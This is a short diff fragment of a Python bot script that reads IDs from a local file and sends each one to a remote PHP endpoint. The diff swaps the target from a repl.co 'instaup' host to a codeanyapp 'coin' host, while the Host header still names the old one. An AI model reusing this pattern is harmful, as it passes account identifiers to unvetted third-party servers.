@@ -61,7 +61,7 @@ def masg(call):
 		file='done.txt'
 		for Mohammed in open(file,'r').read().splitlines():
 			id=str(Mohammed.split('\n')[0])
-			url = "https://script-new-instaup.termux-fil.repl.co/?id={}".format(id)
+			url = "https://coin-ahmedbasrah97282154200.codeanyapp.com/ss.php/?id={}".format(id)
 			headers = {
        "Host": "script-new-instaup.termux-fil.repl.co",
        "Connection": "keep-alive",
